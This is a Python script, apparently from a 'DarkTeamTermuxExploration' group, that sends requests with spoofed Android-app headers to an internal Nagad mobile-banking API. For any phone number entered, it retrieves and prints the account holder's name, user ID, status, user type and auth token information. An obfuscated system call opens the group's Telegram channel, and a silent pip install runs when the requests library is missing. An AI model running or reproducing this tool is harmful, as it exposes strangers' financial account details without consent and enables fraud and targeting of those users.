import os
from os import system as Unknown_X05
try:
    import requests
except:
    Unknown_X05('pip install requests')
    import requests
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
 
bgreen="\033[1;32m"       # Green
bblue="\033[1;34m"        # Blue
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White
logo = f'''

{bcyan} _        _  _  _  ____  
( (    /|(  _  )(   \(  _  )(  __  \ 
{bwhite}|  \  (  (   )  (    \/| (   ) || (  \  )
|   \ |  (_)  |      | (_) || |   ) |
| (\ \)   _   |  |  _  || |   | |
{bblue}| | \    (   )  | \_  )| (   ) || |   ) |
| )  \   )   (  (_)  )   (  (/  )
|/    )_)|/     \|(_)|/     \|(____/ 
                                             
{bwhite}
'''
def SUYAIB():
    print(logo)
# ANSI color codes

url = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in"

def DarkTeamTermuxExploration():
    os.system('clear')
    SUYAIB()
    Unknown_X05('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n'+' '+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'t'+'.'+'m'+'e'+'/'+'D'+'a'+'r'+'k'+'T'+'e'+'a'+'m'+'T'+'e'+'r'+'m'+'u'+'x'+'E'+'x'+'p'+'l'+'o'+'r'+'a'+'t'+'i'+'o'+'n')
    suyaib = input("<\\\> ENTER NAGAD NUMBER : ")
    params = {
        'msisdn': suyaib
        }
    headers = {
    'X-KM-User-AspId': '100012345612345',
    'X-KM-User-Agent': 'ANDROID/1164',
    'X-KM-DEVICE-FGP': '5AB18952A962A31MM9A89524F6282F78905DDE9F94656B5C1CFCEDNN74AE660E',
    'X-KM-Accept-language': 'bn',
    'X-KM-AppCode': '01',
    'Host': 'app2.mynagad.com:20002',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'okhttp/3.14.9'
    }

    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        data = response.json()
        
        # Print each field separately with colors
        print(f"\n\n\n    {bcolors.HEADER}Name: {bcolors.OKGREEN}{data.get('name')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}User ID: {bcolors.OKBLUE}{data.get('userId')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}Status: {bcolors.OKCYAN}{data.get('status')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}User Type: {bcolors.WARNING}{data.get('userType')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}RB Base: {bcolors.OKGREEN}{data.get('rbBase')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}Auth Token Info: {bcolors.FAIL}{data.get('authTokenInfo')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}Verification Status: {bcolors.OKCYAN}{data.get('verificationStatus')}{bcolors.ENDC}")
        print(f"    {bcolors.HEADER}Execution Status: {bcolors.WARNING}{data.get('executionStatus')}{bcolors.ENDC}\n\n\n")
        print("[=] Press enter for back \>>")
    else:
        print(f"{bcolors.FAIL}Error: {response.status_code}, {response.text}{bcolors.ENDC}")

DarkTeamTermuxExploration()
